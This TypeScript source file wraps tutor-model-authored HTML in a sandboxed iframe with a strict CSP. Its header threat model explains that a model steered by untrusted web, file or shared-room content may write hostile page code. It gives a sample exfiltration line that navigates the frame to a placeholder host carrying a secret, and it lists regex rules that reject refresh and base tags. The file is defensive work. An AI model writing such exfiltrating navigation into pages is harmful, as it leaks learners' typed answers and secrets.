/**
 * Builds the framed document for a model-authored interactive page.
 *
 * THREAT MODEL
 * The page's HTML/CSS/JS is written by the tutor model, which may have read
 * untrusted material (web search, uploaded files, a shared room) and so may be
 * steered into writing hostile code. The learner types into the page. Assets
 * worth protecting: the learner's account, API keys and chat history in app
 * storage; the learner's typed answers; the integrity of the learner's turns.
 *
 * Boundaries, strongest first:
 *  1. Opaque origin. The frame is `sandbox="allow-scripts"` and never gets
 *     `allow-same-origin`, so it cannot read app cookies, localStorage,
 *     IndexedDB or the parent DOM. It also has no allow-top-navigation,
 *     allow-popups, allow-forms, allow-modals or allow-downloads.
 *  2. Network. The first element of the document is a CSP meta tag with
 *     `default-src 'none'` and `connect-src 'none'`: no fetch, XHR, WebSocket,
 *     beacon, remote images, fonts or frames. Inline script and style are
 *     allowed (the page is inline by nature); eval is not. Libraries are opt-in
 *     by id from a pinned allowlist (libraries.ts) and add only their exact
 *     versioned URLs. A page's own CSP meta can only tighten this.
 *  3. Self-navigation. CSP inside the frame cannot stop the frame navigating
 *     itself (`location = "https://x/?" + secret`, or a meta refresh), and that
 *     request is an exfiltration channel. Mitigations: <meta http-equiv=refresh>
 *     and <base> are rejected at build time (a tripwire, not a guarantee, since
 *     script can insert them later); the bridge routes every link click to the
 *     host instead of navigating; the host treats any second `load` of the
 *     iframe as a navigation, tears the frame down and shows "blocked".
 *     OPEN CHANNEL: detection happens after the request has left. Prevention
 *     needs an app-level CSP `frame-src` on the embedding document (owned
 *     elsewhere; proposed in the lane report).
 *  4. The host bridge. Messages count only when `event.source` is this frame's
 *     window and they carry this load's random channel id; each is schema- and
 *     size-checked (protocol.ts). `share` and `openLink` need a real learner
 *     gesture judged by the host (frame focused and the parent has transient
 *     user activation, which a click inside the frame propagates), and `share`
 *     is rate-limited, so a page cannot submit learner turns on its own.
 *
 * Residual risks: shared text reaches the tutor model, so it is model input of
 * page provenance and must be labelled as such downstream; a page can draw a
 * convincing fake prompt (phishing) but has no channel to send what is typed
 * except `share`, which goes only to the tutor; a page can burn CPU (the host
 * shows "crashed" if it never becomes ready, and the learner can close it);
 * the CDN query-string leak described in libraries.ts.
 */

import { BRIDGE_CONFIG_PLACEHOLDER, INTERACTIVE_PAGE_BRIDGE_SCRIPT } from "./bridge-script";
import { INTERACTIVE_PAGE_LIBRARIES, isInteractiveLibraryId, type InteractiveLibraryId } from "./libraries";
import { INTERACTIVE_PAGE_LIMITS, type InteractivePageContext, type JsonValue, utf8Bytes } from "./protocol";
import { sanitizeCssValue } from "./theme";

export type InteractivePageRejectionReason = "invalid" | "empty" | "oversize" | "forbidden-markup" | "unknown-library";

export interface InteractivePageRejection {
	ok: false;
	reason: InteractivePageRejectionReason;
	message: string;
	bytes?: number;
	limit?: number;
}

export interface InteractivePageDocument {
	ok: true;
	document: string;
	/** Size of the model-authored HTML in UTF-8 bytes. */
	bytes: number;
	libraries: InteractiveLibraryId[];
}

export interface BuildInteractivePageInput {
	html: unknown;
	title: string;
	/** Random per-load nonce; the host only accepts messages carrying it. */
	channel: string;
	context: InteractivePageContext;
	state?: JsonValue | null;
	libraries?: readonly string[];
}

export const INTERACTIVE_PAGE_BASE_CSS = [
	"html{box-sizing:border-box;margin:0;padding:4px;background:var(--background);color:var(--foreground);font-family:var(--font-sans);font-size:15px;line-height:1.5;-webkit-text-size-adjust:100%}",
	"*,*::before,*::after{box-sizing:inherit}",
	"body{margin:0;overflow-wrap:anywhere}",
	"img,svg,canvas,video{max-width:100%}",
	"code,kbd,pre,samp{font-family:var(--font-mono)}",
	"a{color:var(--primary)}",
	":where(button,input,select,textarea){font:inherit;color:inherit}",
	":where(button){min-height:2.75rem;padding:.4rem .8rem;border:1px solid var(--border);border-radius:var(--radius);background:var(--card);cursor:pointer}",
	":where(button:disabled){opacity:.55;cursor:default}",
	":where(input:not([type=range]):not([type=checkbox]):not([type=radio]),select,textarea){min-height:2.75rem;padding:.35rem .5rem;border:1px solid var(--input);border-radius:var(--radius);background:var(--background)}",
	":where(input[type=range],input[type=checkbox],input[type=radio]){accent-color:var(--primary)}",
	":focus-visible{outline:2px solid var(--ring);outline-offset:2px}",
	".keating-sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}",
	"html[data-reduced-motion=true] *,html[data-reduced-motion=true] *::before,html[data-reduced-motion=true] *::after{animation-duration:.001ms!important;animation-iteration-count:1!important;transition-duration:.001ms!important;scroll-behavior:auto!important}",
].join("");

const FORBIDDEN_MARKUP: { pattern: RegExp; label: string }[] = [
	{ pattern: /<meta\b[^>]*http-equiv\s*=\s*["']?\s*refresh/i, label: "<meta http-equiv=\"refresh\">" },
	{ pattern: /<base\b/i, label: "<base>" },
];

function reject(reason: InteractivePageRejectionReason, message: string, extra: Partial<InteractivePageRejection> = {}): InteractivePageRejection {
	return { ok: false, reason, message, ...extra };
}

function escapeHtml(value: string): string {
	return value.replace(/[&<>"']/g, (char) => `&#${char.charCodeAt(0)};`);
}

/** JSON safe to place inside an inline <script>. */
export function inlineScriptJson(value: unknown): string {
	return JSON.stringify(value).replace(/</g, "\\u003c").replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029");
}

export function interactivePageCsp(libraries: readonly InteractiveLibraryId[]): string {
	const picked = libraries.map((id) => INTERACTIVE_PAGE_LIBRARIES[id]);
	const scripts = picked.flatMap((library) => [...library.scripts.map((script) => script.src), ...library.scriptSources]);
	const styles = picked.flatMap((library) => library.styles.map((style) => style.href));
	const fonts = picked.flatMap((library) => library.fontSources);
	return [
		"default-src 'none'",
		["script-src 'unsafe-inline'", ...scripts].join(" "),
		["style-src 'unsafe-inline'", ...styles].join(" "),
		"img-src data: blob:",
		["font-src data:", ...fonts].join(" "),
		"media-src data: blob:",
		"connect-src 'none'",
		"worker-src 'none'",
		"frame-src 'none'",
		"object-src 'none'",
		"manifest-src 'none'",
		"base-uri 'none'",
		"form-action 'none'",
	].join("; ");
}

function themeRule(context: InteractivePageContext): string {
	const declarations = Object.entries(context.variables)
		.filter(([name]) => /^--[a-z0-9-]{1,48}$/.test(name))
		.map(([name, value]) => `${name}:${sanitizeCssValue(value)};`)
		.join("");
	return `:root{color-scheme:${context.appearance};${declarations}}`;
}

function libraryMarkup(libraries: readonly InteractiveLibraryId[]): string {
	const picked = libraries.map((id) => INTERACTIVE_PAGE_LIBRARIES[id]);
	const imports = Object.assign({}, ...picked.map((library) => library.imports)) as Record<string, string>;
	return [
		...picked.flatMap((library) => library.styles.map((style) => `<link rel="stylesheet" href="${style.href}" integrity="${style.integrity}" crossorigin="anonymous">`)),
		Object.keys(imports).length ? `<script type="importmap">${inlineScriptJson({ imports })}</script>` : "",
		...picked.flatMap((library) => library.scripts.map((script) => `<script src="${script.src}" integrity="${script.integrity}" crossorigin="anonymous"></script>`)),
	].join("");
}

/**
 * Wraps model-authored HTML in the framed document. Returns a typed rejection,
 * never throws. The prefix is emitted before any authored byte, so the CSP is
 * the first element the parser sees whatever the page contains; a page's own
 * doctype, <html> and <head> tags after it are parse errors the parser absorbs.
 */
export function buildInteractivePageDocument(input: BuildInteractivePageInput): InteractivePageDocument | InteractivePageRejection {
	const { html } = input;
	if (typeof html !== "string") return reject("invalid", "The page source is not text.");
	if (html.includes("\u0000")) return reject("invalid", "The page source contains binary data.");
	const bytes = utf8Bytes(html);
	if (bytes > INTERACTIVE_PAGE_LIMITS.maxHtmlBytes) {
		return reject("oversize", `The page is ${Math.ceil(bytes / 1024)} KB; the limit is ${INTERACTIVE_PAGE_LIMITS.maxHtmlBytes / 1024} KB.`, { bytes, limit: INTERACTIVE_PAGE_LIMITS.maxHtmlBytes });
	}
	const visible = html.replace(/<!--[\s\S]*?-->/g, "").replace(/<!doctype[^>]*>/gi, "").replace(/<\/?(html|head|body)\b[^>]*>/gi, "").trim();
	if (!visible) return reject("empty", "The page has no content.");
	for (const rule of FORBIDDEN_MARKUP) {
		if (rule.pattern.test(html)) return reject("forbidden-markup", `The page uses ${rule.label}, which could navigate the frame away.`);
	}
	const requested = input.libraries ?? [];
	const unknown = requested.find((id) => !isInteractiveLibraryId(id));
	if (unknown !== undefined) return reject("unknown-library", `"${String(unknown).slice(0, 40)}" is not an allowed library.`);
	const libraries = [...new Set(requested)] as InteractiveLibraryId[];

	const config = {
		channel: input.channel,
		state: input.state ?? null,
		context: { appearance: input.context.appearance, reducedMotion: input.context.reducedMotion },
		maxStateBytes: INTERACTIVE_PAGE_LIMITS.maxStateBytes,
	};
	const bridge = INTERACTIVE_PAGE_BRIDGE_SCRIPT.replace(BRIDGE_CONFIG_PLACEHOLDER, () => inlineScriptJson(config));
	const title = escapeHtml(input.title.slice(0, INTERACTIVE_PAGE_LIMITS.maxTitleLength));
	const motion = input.context.reducedMotion ? "true" : "false";

	const prefix = [
		"<!doctype html>",
		`<meta http-equiv="Content-Security-Policy" content="${escapeHtml(interactivePageCsp(libraries))}">`,
		'<meta charset="utf-8">',
		'<meta name="viewport" content="width=device-width, initial-scale=1">',
		'<meta name="referrer" content="no-referrer">',
		`<style id="keating-page-base">${INTERACTIVE_PAGE_BASE_CSS}</style>`,
		`<style id="keating-page-theme">${themeRule(input.context)}</style>`,
		`<script id="keating-page-bridge">${bridge}</script>`,
		`<script>document.documentElement.setAttribute("data-theme",${inlineScriptJson(input.context.appearance)});document.documentElement.setAttribute("data-reduced-motion",${inlineScriptJson(motion)});</script>`,
		libraryMarkup(libraries),
		`<title>${title}</title>`,
	].join("");
	return { ok: true, document: `${prefix}\n${html}`, bytes, libraries };
}
